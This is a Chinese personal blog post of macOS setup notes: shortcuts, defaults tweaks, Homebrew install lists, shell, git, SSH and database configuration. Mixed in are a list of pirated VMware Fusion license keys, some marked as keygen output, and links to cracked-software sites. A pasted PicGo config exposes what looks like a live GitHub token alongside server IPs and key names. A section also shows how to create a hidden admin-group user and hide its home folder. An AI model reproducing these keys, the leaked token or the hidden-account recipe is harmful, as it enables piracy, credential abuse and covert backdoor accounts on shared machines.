Esc 选择要强制退出的程序（可以用 Shift 键选中多个）遇到程序假死的情况下特别有用，可以强制关闭，无需等待。 _Command-Shift-Option-Esc _ 强制退出当前程序 选中程序图标，按住 Option + 右键单击  置顶窗口 拖拽其他窗口的时候按住command键即可，原来的窗口会永远在最上面。\n文件操作-重命名 选中文件回车是对文件重命名\n复制目录下文件名列表 command+a，command+c。然后打开一个文本编辑器（比如TextMate），command+v即可。\nFinder当前路径  在Finder顶部显示文件路径defaults write com.apple.finder _FXShowPosixPathInTitle -bool YES 快Finder底部显示路径信息 -Option+Cmd+P 复制文件路径 -选中文件，按Command+C  在Finder的当前目录打开终端 自动清空废纸篓 在Finder中选中文件，使用command+delete删除文件，\n如果想彻底清除，使用shift+command+delete就会自动清空废纸篓。\n显示隐藏文件 Finder中输入shift+command+.可以显示隐藏文件，\n想恢复原来的设置，再输入一遍shift+command+.即可。\n程序坞Dock设置 1 2 3 4 5 6 7 8  defaults write com.apple.dock autohide-time-modifier -float 0.2 \u0026amp;\u0026amp; killall Dock # 设置启动坞动画时间设置为 0.2 秒 defaults delete com.apple.dock autohide-time-modifier \u0026amp;\u0026amp; killall Dock # 恢复启动坞默认动画时间 defaults write com.apple.dock autohide-delay -int 0 \u0026amp;\u0026amp; killall Dock # 设置启动坞响应时间最短 defaults delete com.apple.Dock autohide-delay \u0026amp;\u0026amp; killall Dock # 恢复默认启动坞响应时间 defaults write com.apple.dock use-new-list-stack -bool TRUE; killall Dock # Dock中的文件夹(可能不习惯)   Dock栏优化\n显示器 如何移动菜单栏图标的位置 我们可以通过按住 CMD + 拖拽来调整标志点的位置\n菜单栏图标管理-Bartender 4 屏幕滚动到应用程序的顶部或底部 command+上下方向键\n调整视觉大小 Command+ -/+\n触摸板设置 触摸板轻触和右键: 系统偏好设置 - 触控板 - 光标与点按 - 勾选 轻点来点按 和 辅助点按（双指点按或轻点）\n三指拖移: 系统偏好设置 - 辅助功能 - 指针控制 - 触控板选项 - 启用拖移 - 三指拖移\n调度中心 取消自动重新排列空间: 系统偏好设置 - 调度中心 - 取消勾选 根据最近使用情况自动重新排列空间\n网络配置 如何配置多种网络环境 打开系统偏好设置-网络，点击位置下拉菜单，找到编辑位置，打开后即可增删编辑多套网络设置，设置完成后保存。 这时点击屏幕左上角的苹果图标，在下拉菜单里增加了一个位置选项，里面就是你配置好的多种网络设置，点击切换即可。\n声音设置 控制音频切换: 系统偏好设置 - 声音 - 在菜单中显示音量,关闭开机提示音\u0026quot;咚“\n或者 sudo nvram StartupMute=%01\n键盘设置 Tab 键移动焦点: 系统偏好设置 - 键盘 - 快捷键 - 全键盘控制 所有控制\n添加程序快捷键\n安全与隐私 Mac的原生输入法  中英文混合输入，输入中文的时候，打开caps_lock键，可以直接输入英文，关掉又切换回中文 选词，通过－＋号可以切换字或词 使用Fn可以输入表情 用\u0026rsquo;可以进行手动分词，比如fang\u0026rsquo;an（方案）\nmac pinyin提供了“拆字”功能，比如“鱻”，输入“yu yu”然后按 「shift+空格」即可。\n  特殊字符输入 省略号，option+;\n约等于，option+x\n度，shift+option+8\n除号，option+/\n无穷大，option+5\n小于等于，option+,\n大于等于，option+.\n不等于，option+=\n圆周率Pi，option+p\n正负，shift+option+=\n平方根，option+v\n总和，option+w\n商标Trademark，option+2\n注册，option+r\n版权，option+g\ncommand+I直接打开邮件 使用Safari浏览网页的时候，如果你想把当前页面通过邮件发送给自己或别人，使用command+I，可以直接打开邮件并把当前网页附加到待发送的邮件中。\n键盘映射神器karabiner-elements \u0026amp; 自动化神奇keyboard-maestro 键盘映射 karabiner-elements\n参考capslox\n1  brew install --cask karabiner-elements keyboard-maestro   电池设置 常用软件 防火墙 1  brew install --cask lulu   uTools-效率神器 1  brew install --cask utools m-cli   代理软件 全局代理 proxychains \u0026amp; proxifier 1 2 3 4  brew install proxychains-ng proxifier vim /usr/local/etc/proxychains.conf # 配置文件 proxychains4 -q -f config_file program_name [arguments] # 全局代理特定程序 proxychains4 -q /bin/zsh # 全局代理zsh shell   VPN 1 2  brew install tinc shimo openvpn-connect expressvpn zerotier-one brew install --cask viscosity   socks/vmess/ssr代理 1  brew install --cask clash-for-windows clashx v2rayu tunnelblick shadowsocksx-ng frps frpc   clash源\n1 2  https://api.dler.io/sub?target=clash\u0026amp;new_name=true\u0026amp;url=https%3A%2F%2Fjiang.netlify.app\u0026amp;insert=false\u0026amp;config=https%3A%2F%2Fraw.githubusercontent.com%2FMazeorz%2Fairports%2Fmaster%2FClash%2FSkslaPro-Balance.ini https://jiedian1.coding.net/p/1/d/1/git/raw/master/2.txt?download=true   Google插件\nbrew install --cask google-chrome firefox wpsoffice baidunetdisk folx bitwarden tencent-lemon 通讯软件 1 2  brew install --cask slack wechat qq dingtalk twitter telegram-desktop tencent-meeting brew install sunnyyoung/repo/wechattweak-cli \u0026amp;\u0026amp; wechattweak-cli --install   weechat上手指南\n远程桌面  ToDesk  1  ln -s \u0026#34;/System/Library/CoreServices/Applications/Screen Sharing.app\u0026#34; ~/Applications/   影音处理 1 2  brew install neteasemusic bilibili yesplaymusic androidtool handbrake omniplayer brew reinstall --cask obs blackhole-2ch   磁盘挂载-mounty 1  brew install --cask mounty   网盘 1  brew install --cask cyberduck syncthing adrive baidunetdisk   学习软件  XMind  1 2 3  brew install --cask anki marginnote bob brew install --cask devonthink # 文献管理工具 brew install basictex \u0026amp;\u0026amp; sudo tlmgr update --self \u0026amp;\u0026amp; sudo tlmgr install dvipng   Bob插件集合 安装 bobplugin-google-translate\nRSS神器-winds 1  brew install --cask winds   解压缩The Unarchiver 1  brew install --cask keka   Nosleep 1  brew install --cask nosleep   虚拟机 1  brew install --cask parallels vmware-fusion   vmware-fusion key:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  # for VMWare Fusion 12.x ZF3R0-FHED2-M80TY-8QYGC-NPKYF YF390-0HF8P-M81RQ-2DXQE-M2UT6 ZF71R-DMX85-08DQY-8YMNC-PPHV8 YU5XH-8KZ0Q-M80XY-HQZ7T-PC0EA # generate used keygen fo VMWare Fusion 12.x YF3T8-A6Y16-M819Z-LGNZZ-WFUAA ZZ7JR-4YX57-088EZ-JGNQE-P78AF UZ71U-FTG5M-484JQ-EXZGG-M7RRA UG3NH-8DD4L-480NQ-MDPGZ-YGKU0 CU7TH-42G1K-08D0Q-FGXGV-W3AT2 GV59K-84F84-484JQ-WXPQG-PP8A6 YZ5HK-2RW87-48EUQ-Y6QQC-ZLHC4 UA1NK-8MY0L-4888Z-DPWZC-WGH9A UY3J8-FPD8Q-M85AQ-T5WNV-MZHV6 YU5XH-8KZ0Q-M80XY-HQZ7T-PC0EA FU5X0-4NEE4-0855Z-KMPXG-ZVKC0 YF5T8-8TZ4K-H84LY-X6N59-XQ29D AU5T2-8QX5J-08E8Q-2YZQZ-PAAZD AG7EA-66F55-M8DTZ-2FPZX-YLRV4 AF5RH-8PX8L-M8EMP-0EXZE-ZZ08F AV5N8-2KYEH-48EMY-UYXZG-X20V8 AY3TR-DVFEM-M8DUY-V4M5Z-ZVUZF VF3DA-43Z83-481TZ-34W5Z-NVUZF GZ31A-48E1N-08EGY-MZNGT-QK2X8 YY108-6TE44-M81KY-46XEE-MCHW2   macOS终端优化  command-not-find  iTerm2 1  brew install --cask iterm2 tabby electerm     Apperance\n  Profile\n  Color-Sechemes\n1  git clone https://github.com/mbadolato/iTerm2-Color-Schemes.git ~/.config/iterm2/color-schemes   导入文件时，按住Command+Shift+. 可显示隐藏文件\nSSH-vps配置 SSH登录过程\n1 2 3 4 5  Host VPS HostName 10x.132.34.104 User root Port 22222 IdentityFile ~/.ssh/ed25519_vps    文件传输命令  1 2  scp -i ~/.ssh/ed25519_vps -P 22222 /Path/to/file root@10x.132.34.104:/var/opt/ # 上传文件 scp -i ~/.ssh/ed25519_vps -P 22222 root@10x.132.34.104:/Path/to/file . # 下载文件到当前目录    端口转发  1  ssh -CNfg -L 127.0.0.1:3389:52.192.75.217:63389 -i ~/.ssh/ed25519_crkmyth1cal -p22222 root@52.192.75.217   SSH超时登录解决方案  修改服务器参数 /etc/ssh/sshd_config  1 2  ClientAliveInterval 60 ClientAliveCountMax 60    修改本地参数 /etc/ssh/ssh_config  1 2  ServerAliveInterval 60 ServerAliveCountMax 60   或者使用ssh登录时 ssh -o ServerAliveInterval=30 root@server-ip\nOh-My-Zsh 1 2 3 4 5 6 7 8 9 10 11  sh -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\u0026#34; # 安装oh-my-zsh echo \u0026#34;DISABLE_MAGIC_FUNCTIONS=true\u0026#34; \u0026gt;\u0026gt; ~/.zshrc # 关掉URL转义 echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.zshrc \u0026amp;\u0026amp; source ~/.zshrc # brew换清华源 brew install gnu-sed \u0026amp;\u0026amp; alias sed=gsed # 使用gsed命令 sed -i \u0026#39;s/robbyrussell/gnzh/g\u0026#39; .zshrc # 替换主题 git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions # 下载zsh-autosuggestions插件 git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting # 下载syntax-highling插件 git clone https://github.com/zsh-users/zsh-completions ${ZSH_CUSTOM:=~/.oh-my-zsh/custom}/plugins/zsh-completions # 下载zsh-completions brew install autojump sed -i \u0026#34;s/plugins.*/plugins=(git web-search autojump zsh-autosuggestions zsh-syntax-highlighting zsh-completions )/g\u0026#34; ~/.zshrc # 配置插件 source ~/.zshrc   Tmux  Tmux Plugin Manager使用及具体插件 tmux插件管理器和插件 tmux入坑指南 tpm—套件管理工具 Tmux使用手册  1 2 3  brew install tmux git clone --recursive https://github.com/tony/tmux-config.git ~/.tmux ln -s ~/.tmux/.tmux.conf ~/.tmux.conf    Swiss Army Knife for macOS 1  brew install m-cli   实用命令 关闭SIP 后面不关闭 SIP 的话类似于 proxychains-ng 这种代理神器就无法使用。\n重启 Mac，按住 Option 键进入启动盘选择模式，按 ⌘ + R 进入 Recovery 模式。\n「菜单栏」 -\u0026gt;「 实用工具（Utilities）」-\u0026gt; 「终端（Terminal）」：\n1 2 3 4  csrutil disable # 关闭SIP csrutil status # 查看SIP状态 System Integrity Protection status: disabled.   取消4位密码限制 1 2  pwpolicy -clearaccountpolicies # 取消4位数密码限制  passwd # 更改密码   允许App的来源 1  sudo spctl --master-disable   Tips-pfetch-查看主机信息 1 2 3 4  brew install pfetch # 查看主机配置信息 brew install ipinfo-cli brew install nnn brew install peco   开机静音(咚) sudo nvram SystemAudioVolume=%80\n恢复截屏损坏图片 你的可能是被修改过了，我们可以通过以下命令恢复默认路径：\n1  defaults delete com.apple.screencapture location   注销重新登录，再次截屏看看文件是否保存在桌面上了。\n让终端说英文 say Hello Hacker\n搜索命令mdfind mdfind是一个非常灵活的全局搜索命令，类似Spotlight的命令行模式，可以在任何目录执行文件名、文件内容进行检索\n元信息命令mdls 1 2  mdls ~/Desktop/a.jpg mdls ~/Desktop/a.jpg|grep ISO   查看文件信息的命令file 查看相关文件的类型和属性\n生成man page的pdf文档 1  man -t grep |open -f -a Preview   开启root用户 打开Finder，输入shift+command+g，在前往文件夹中输入：\n1  /System/Library/CoreServices   然后在目录中找到目录实用工具并打开，解开左下角的小锁，然后点击顶部菜单的，你就会看到启用或停用root用户的选项了。然后我们在命令行下执行su -，就可以切换到root目录下，root的默认目录是/var/root。\n多个用户登陆一个程序 1  open -n /Applications/XXX.app   使用sips命令批量处理图片 1 2 3  sips -Z 800~/Pictures/ # 把当前用户图片文件夹下的所有JPG图片宽度缩小为800px，高度按比例缩放 sips -r 90~/Pictures/ # 顺时针旋转90° sips -f vertical ~/Pictures/*.JPG # 垂直反转   获悉目录空间 du -sh *\n对磁盘权限进行检查和修复 1  sudo periodic daily weekly monthly   截图默认类型 1  defaults write com.apple.screencapture type -string JPEG   重建Spotlight索引 1 2 3  sudo mdutil -i off / # 该命令用来关闭索引 sudo mdutil -E /` # 该命令用来删除索引 sudo mdutil -i on /` # 该命令用来重建索引   批量复制文件 1  cp *.png *.jpeg *.gif /destpath   Mac不休眠 在终端中输入：pmset noidle，即可。只要该命令一直运行，Mac就不会进入睡眠状态。关掉终端或ctrl+c可以取消该命令。 pmset是OS X提供的命令行管理电源的工具，其功能远不止于此。\npmset -g，查看当前电源的使用方案 sudo pmset -b displaysleep 5，设置电池供电时，显示器5分钟内进入睡眠 sudo pmset schedule wake \u0026ldquo;02/01/13 20:00:00\u0026rdquo;，设置电脑在2013年2月1日晚8点唤醒电脑 ……\n写作软件 宇宙最强编辑器-Emacs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  brew tap d12frosted/emacs-plus sudo chown -R $(whoami) /usr/local/share/man/man8 brew install emacs-plus --HEAD --with-modern-black-dragon-icon echo \u0026#34;ln -s /usr/local/opt/emacs-plus@28/Emacs.app /Applications \u0026#34; brew install git ripgrep coreutils fd git clone --depth 1 https://github.com/hlissner/doom-emacs ~/.emacs.d ~/.emacs.d/bin/doom install # 配置emacs配置文件 echo \u0026#39;--------\u0026gt; 添加emacs配置到zshrc ...\u0026#39; echo \u0026#34; ### Emacs alias e=\u0026#39;emacsclient -a emacs\u0026#39; alias vi=\u0026#39;emacsclient -a emacs\u0026#39; #export PATH=\u0026#39;\\$HOME/.emacs.d/bin:\\$PATH\u0026#39; ### Emacs END \u0026#34; \u0026gt;\u0026gt; .zshrc sudo ln -s ~/.emacs.d/bin/doom /usr/bin/doom   Markdown编辑器-Zettlr 1  brew install --cask zettlr notable   截屏/GIF录屏工具  Cleanshot X iShot\n kap LICEcap  1 2 3  brew install --cask keycastr # keycastr录制视频屏幕上显示键盘快捷键 brew install --cask kap brew install --cask licecap   截屏提字OCR识别  TextSniper Text Scanner  终端录制工具 1  brew install ttygif asciinema   图床软件-PicGo 1  brew install --cask picgo    picgo命令行 /Applications/PicGo.app/Contents/MacOS/PicGo upload picgo配置文件 ~/Library/Application Support/picgo/data.json  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82  { \u0026#34;picBed\u0026#34;: { \u0026#34;current\u0026#34;: \u0026#34;github\u0026#34;, \u0026#34;list\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;SM.MS图床\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;smms\u0026#34;, \u0026#34;visible\u0026#34;: false }, { \u0026#34;name\u0026#34;: \u0026#34;腾讯云COS\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;tcyun\u0026#34;, \u0026#34;visible\u0026#34;: false }, { \u0026#34;name\u0026#34;: \u0026#34;微博图床\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;weibo\u0026#34;, \u0026#34;visible\u0026#34;: false }, { \u0026#34;name\u0026#34;: \u0026#34;GitHub图床\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;github\u0026#34;, \u0026#34;visible\u0026#34;: true }, { \u0026#34;name\u0026#34;: \u0026#34;七牛图床\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;qiniu\u0026#34;, \u0026#34;visible\u0026#34;: false }, { \u0026#34;name\u0026#34;: \u0026#34;Imgur图床\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;imgur\u0026#34;, \u0026#34;visible\u0026#34;: false }, { \u0026#34;name\u0026#34;: \u0026#34;阿里云OSS\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;aliyun\u0026#34;, \u0026#34;visible\u0026#34;: false }, { \u0026#34;name\u0026#34;: \u0026#34;又拍云图床\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;upyun\u0026#34;, \u0026#34;visible\u0026#34;: false } ], \u0026#34;github\u0026#34;: { \u0026#34;branch\u0026#34;: \u0026#34;main\u0026#34;, \u0026#34;customUrl\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;images/\u0026#34;, \u0026#34;repo\u0026#34;: \u0026#34;crkmythical/PicGo\u0026#34;, \u0026#34;token\u0026#34;: \u0026#34;ghp_PAs54ZDPUKBDQvWuuFanv5UTiTYVKm1Af2tT\u0026#34; } }, \u0026#34;settings\u0026#34;: { \u0026#34;shortKey\u0026#34;: { \u0026#34;picgo:upload\u0026#34;: { \u0026#34;enable\u0026#34;: true, \u0026#34;key\u0026#34;: \u0026#34;CommandOrControl+Shift+P\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;upload\u0026#34;, \u0026#34;label\u0026#34;: \u0026#34;快捷上传\u0026#34; } }, \u0026#34;server\u0026#34;: { \u0026#34;port\u0026#34;: 36677, \u0026#34;host\u0026#34;: \u0026#34;127.0.0.1\u0026#34;, \u0026#34;enable\u0026#34;: true }, \u0026#34;showUpdateTip\u0026#34;: false, \u0026#34;pasteStyle\u0026#34;: \u0026#34;markdown\u0026#34;, \u0026#34;autoStart\u0026#34;: true, \u0026#34;uploadNotification\u0026#34;: true, \u0026#34;rename\u0026#34;: false, \u0026#34;autoRename\u0026#34;: false, \u0026#34;customLink\u0026#34;: \u0026#34;[[Resource/image$fileName][$url]]\u0026#34;, \u0026#34;privacyEnsure\u0026#34;: true }, \u0026#34;picgoPlugins\u0026#34;: {}, \u0026#34;debug\u0026#34;: true, \u0026#34;PICGO_ENV\u0026#34;: \u0026#34;GUI\u0026#34;, \u0026#34;needReload\u0026#34;: false, \u0026#34;uploaded\u0026#34;: [] }   静态博客生成器-Hexo 1 2 3 4 5 6 7 8 9 10 11 12  brew install git node # 安装git 和node npm config set registry https://registry.npm.taobao.org # 配置npm源 npm install -g hexo-cli # 安装hexo proxychains4 hexo init Mr-Framework # 初始化博客 git clone https://github.com/yelog/hexo-theme-3-hexo.git themes/3-hexo # 下载3-hexo主题 echo \u0026#39;--------\u0026gt; 添加hexo配置到zshrc ...\u0026#39; echo \u0026#34; ###### Hexo alias hs=\u0026#39;hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo s\u0026#39; alias hdb=\u0026#39;hexo clean \u0026amp;\u0026amp; hexo g \u0026amp;\u0026amp; hexo d \u0026amp;\u0026amp; git add . \u0026amp;\u0026amp; git commit -m \u0026#34;update\u0026#34; \u0026amp;\u0026amp; git push -f \u0026#39; ##### Hexo END \u0026#34; \u0026gt;\u0026gt; ~/.zshrc   编程开发软件 基础配置 Git配置  配置socks5代理  1 2 3 4 5 6  git config --global http.proxy \u0026#39;socks5://127.0.0.1:1080\u0026#39; git config --global https.proxy \u0026#39;socks5://127.0.0.1:1080\u0026#39; # 取消git代理 git config --global --unset http.proxy git config --global --unset https.proxy cat ~/.gitconfig # 查看 git 配置 或 git config -l    配置用户信息  1 2 3 4 5  git config --global user.name \u0026#34;crkmyth1cal\u0026#34; git config --global user.email \u0026#34;ckrmyth1cal@protonmail.com\u0026#34; git config user.name crkmyth1cal git config user.email crkmyth1cal@protonmail.com    配置编辑器和对比工具  1 2  git config --global core.editor emacs git config --global merge.tool vimdiff    配置密码  1 2  git config --global credential.helper \u0026lt;passwd\u0026gt; git config --global credential.helper \u0026#39;cache --timeout 3600\u0026#39;    查询配置  1 2 3 4 5 6 7 8 9 10 11 12  git config --system --list # 查看系统配置 git config --global --list # 查看当前用户配置 git config --local --list # 查看当前仓库配置 git config --list # 查看全部配置 git config --list # 我们执行最后一条指令 core.symlinks=false core.autocrlf=true core.fscache=true color.diff=auto color.status=auto color.branch=auto color.interactive=true    获取git帮助  1 2 3  git help \u0026lt;verb\u0026gt; git \u0026lt;verb\u0026gt; --help man git-\u0026lt;berb\u0026gt;    配置ssh-key并添加到git账户  1 2 3  ssh-keygen cat ~/.ssh/id_rsa.pub | clipcopy ssh-copy-id -i ~/.ssh/id_rsa.pub -p 22 root@vps    通过 ssh-add 添加到密钥管理器ssh-agent中  1 2  ssh-add ~/.ssh/ed25519_crkmy1cal ssh-add ~/.ssh/ed25519_askDing    给当前仓库添加子仓库  1 2 3 4 5 6  cd Advanced-Ethical-Hacking-Training git submodule add git@github.com:askDing/PicGo.git Resources # 删除子模块 git submodule deinit {MODULE} git rm --cached {MODULE}   克隆私有仓库 配置SSH Keys 执行如下命令，新建SSH Key，直接 Command+V\n1  pbcopy \u0026lt; ~/.ssh/*.pub| open https://github.com/settings/keys   克隆 1 2  ssh-add ~/.ssh/ed25519_crkmythical # 添加私钥 git clone git@github.com:crkmythical/dotfiles.git   JDK Oracle JDK\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  brew install --cask zulu # https://github.com/mdogan/homebrew-zulu echo \u0026#39;\u0026lt;------------JDK版本管理脚本-------\u0026gt;配置JDK切换版本函数jdk\u0026#39; echo \u0026#39; #### 切换jdk版本的函数 jdk(){ echo \u0026#34; \u0026gt;\u0026gt;\tUsage: jdk [-v version] \u0026#34; export JAVA_HOME=$(/usr/libexec/java_home $@); java -version echo \u0026#34;JAVA_HOME:\u0026#34; $JAVA_HOME } \u0026#39; \u0026gt;\u0026gt; ~/.zshrc   Maven 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  brew install maven echo \u0026#34; \u0026lt;settings xmlns=\u0026#34;http://maven.apache.org/SETTINGS/1.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd\u0026#34;\u0026gt; \u0026lt;localRepository\u0026gt;/Users/crkmyth1cal/Code/.repository/\u0026lt;/localRepository\u0026gt; \u0026lt;mirrors\u0026gt; \u0026lt;mirror\u0026gt; \u0026lt;id\u0026gt;alimaven\u0026lt;/id\u0026gt; \u0026lt;name\u0026gt;aliyun maven\u0026lt;/name\u0026gt; \u0026lt;mirrorOf\u0026gt;central\u0026lt;/mirrorOf\u0026gt; \u0026lt;url\u0026gt;http://maven.aliyun.com/nexus/content/groups/public/\u0026lt;/url\u0026gt; \u0026lt;/mirror\u0026gt; \u0026lt;/mirrors\u0026gt; \u0026lt;/settings\u0026gt; \u0026#34; \u0026gt; ~/.m2/settings.xml   Dash code snippets manager-SnippetsLab 编码解码Devutils \u0026amp; Boop Beyond Compare HTTP接口调试工具http-toolkit \u0026amp;paw 1  brew install --cask http-toolkit paw   ASCII艺术编辑器Monodraw Docker 1  brew install --cask docker   termius 1  brew install --cask termius   macOS自带的Apache服务器  Apache服务器的文件目录 /Library/WebServer/Documents\n相关命令：  1 2 3  sudo apachectl start #开启apache sudo apachectl restart #重启apache sudo apachectl stop #关闭apache   IntelliJ IDE 激活教程\nJetBrains激活\n /Users/用户名/Library/Application Support/IntelliJIdeaXXXXXX，用于保存安装的插件 /Users/用户名/Library/Caches/IntelliJIdeaXXXXXX，用于保存缓存、日志、以及本地的版本控制信息（local history 这个功能） /Users/用户名/Library/Preferences/IntelliJIdeaXXXXXX，用于保存自己IDEA的个人配置，相当于 Windows版本的config目录 /Users/用户名/Library/ApplicationSupport/JetBrains/IntelliJIdeaXXXXXX，这个目录下也有其配置文件  1  brew install --cask intellij-idea scenebuilder pycharm android-studio   Database 1  brew install --cask dbeaver-community # 数据库客户端   MySQL 1 2 3 4 5 6  brew install mysql@5.7 # 安装mysql5.7 brew install mycli brew services start/stop mysql@5.7 # 启动/停止mysql服务 echo \u0026#39;export PATH=\u0026#34;/usr/local/opt/mysql@5.7/bin:$PATH\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.zshrc mysql_secure_installation # 配置root密码 mysql -uroot -p # 连接mysql    MySQL服务操作  1  mysql.server start/stop/restart/status # 启动/停止/重启/状态 mysql    设置MySQL密码  1 2 3 4 5 6 7  use mysql; show variables like \u0026#39;validate_password%\u0026#39;; # 查看MySQL完整的初始密码规则 set global validate_password.length=4; set global validate_password.policy=low; ALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;r00t\u0026#39;; # set password for \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; = password(\u0026#39;你设置的密码\u0026#39;);  flush privileges; # 刷新权限 并退出 quit;    数据库开启外连  1 2  grant all on *.* to root@\u0026#39;%\u0026#39; identified by \u0026#39;你设置的密码\u0026#39; with grant option; flush privileges;   SqliteBrowser 1  brew install --cask db-browser-for-sqlite   MongoDB 1 2 3 4  brew tap mongodb/brew brew install mongodb-community brew services start mongodb-community brew install --cask robo-3t   Redis 1  brew install --cask another-redis-desktop-manager   安全相关 hexfiend 1  brew install --cask hex-fiend   aircrack-ng 1 2 3 4  brew install aircrack-ng binwalk hashcat masscan metasploit nmap sqlmap wpscan wireshark brew tap caffix/amass brew install amass brew install --cask jd-gui maltego   radare2 -like IDA 1  brew install radare2   linkliar 可以帮助你哄骗 Wi-Fi 和以太网接口的 MAC 地址\n1  brew install --cask linkliar   FAQ Mac到底要不要关机  如果每天用，建议 Mac 不关机，使用睡眠模式； 如果不常用，建议 Mac 关机。  关于是否需要一直充电 Apple 官方的建议：\n 不要一直使用便携式电脑电源。\n比较理想的使用方法是：外出时用电池，回到家充电，以保持电池电流的流动状态。\n 如何重置SMC 重置 SMC 是个 Mac 常用操作，电源、背光、亮屏、不能充电等等，都可以以此解决，不过很多人不知道。如何 重置 SMC 呢？  1、将 Mac 关机。\n2、在内建键盘上，按下键盘左侧的 Shift-Control-Option 键，然后同时按下电源按钮。按住这些按键和电源按钮 10 秒钟。 如果您的 MacBook Pro 带有 Touch ID，则 Touch ID 按钮也是电源按钮。\n3、松开所有按键。\n4、再次按下电源按钮以开启 Mac。\n卸载软件后，清楚残留  删除 ~/Library/Application Support下对应的目录 删除~/Library/Preferences下对应的偏好设置文件  多QQ登陆 在已经打开的QQ中，按住「command + N」即可。\n如何解决MAC软件（dmg，akp，app）出现程序已损坏的提示 1  sudo spctl --master-disable   is damaged and can’t be opened. You should move it to the Trash. 1  xattr -cr /Applications/AppName.app   macbook pro 待机一段时间后就自动关机重启 程序切换 command+tab进行顺序切换，\ncommand+shift+tab进行逆序切换\n使用command+`（esc下面的键）进行同组程序切换。\nSpotlight注释功能定位文件 OSX的文件系统提供了Spotlight注释功能，可以帮助用户更有针对性的定位文件。选中一个文件或文件夹，command+I打开简介，在Spotlight注释功能中加入自己特定的关键词。关掉简介窗口，呼出Spotlight并输入刚才的关键词，可以准确定位到相关的文件或文件夹。\n查看WI-FI地址 按住 Option 键，同时点击右上角 WiFi 图标即可。\n删除appStore下载的程序 打开launchpad，按住option键，就会看到所有的程序图标都会像iOS图标那样晃动起来，点击图标左上角的叉，即可删除程序\n强制关闭程序 方法一：option+command+esc，调出强制退出应用程序的窗口，选择要退出的进程即可。\n方法二：打开活动监视器，类似windows的任务管理器一样操作就好了。\n方法三：命令行下的kill命令，比如想杀掉TextMate，首先用ps -ax|grep TextMate找到进程号，然后用kill -9进程号，\n即可。 至此，天下无杀不掉的进程。\nMac如何创建并隐藏用户 启用Root用户\n查看各用户ID 1  dscl . -list /Users UniqueID   查看用户所属组ID 1  dscl . -read /Users/root PrimaryGroupID   查看各个组ID 1  dscl . -list /Groups PrimaryGroupID   创建用户 \u0026ldquo;luser\u0026rdquo; 并隐藏 1 2 3 4 5 6  dscl . -create /Users/luser IsHidden 1 dscl . -create /Users/luser UserShell /bin/zsh dscl . -create /Users/luser RealName \u0026#34;Ethan Hunter\u0026#34; dscl . -create /Users/luser UniqueID \u0026#34;1010\u0026#34; dscl . -create /Users/luser PrimaryGroupID 80 # 80 admin组 dscl . -create /Users/luser NFSHomeDirecotry /Users/luser   创建组 1 2 3  dscl . -list /Groups PrimaryGroupID | awk \u0026#39;{print $2}\u0026#39; | sort -n dscl . -create /Groups/\u0026lt;newGroup\u0026gt; dscl . -create /Groups/\u0026lt;newGroup\u0026gt; PrimaryGroupID \u0026lt;9527\u0026gt;   隐藏个人专属目录和分享点 1 2  sudo chflags hidden /Users/luser sudo dscl . -delete \u0026#34;/SharePoints/Hidden User’s Public Folder\u0026#34; #the user with the long name “Hidden User”   修改密码 1  dscl . -passwd /Users/luser \u0026lt;password\u0026gt;   加入admin用户组 1  dscl . -append /Groups/wheel GroupMembership luser   从组中删除用户 1  delete \u0026lt;groupName\u0026gt; GroupMembership \u0026lt;luser\u0026gt;   开机自启 参考 破解网站：\n  麦氪搜 iMacSO.com-验证码\n  点点Mac下载网-付费\n  One麦普-麻烦\n  Digit77.com-麻烦\n  精品Mac应用分享-方便\n  MacWK-方便\n  appstorrent-简单\n  MacOS之程序员\n  awesome-macos-command-line\n  MacOS X配置指南\n  MacUpdate价格跟踪\n  awosome-mac\n  ","description":"","id":38,"section":"en","tags":null,"title":"macOS使用记录","uri":"http://crkmythical.github.io/en/blog/macos%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"},{"content":"编写进度\n   免杀专题\nexp检测流程和etl 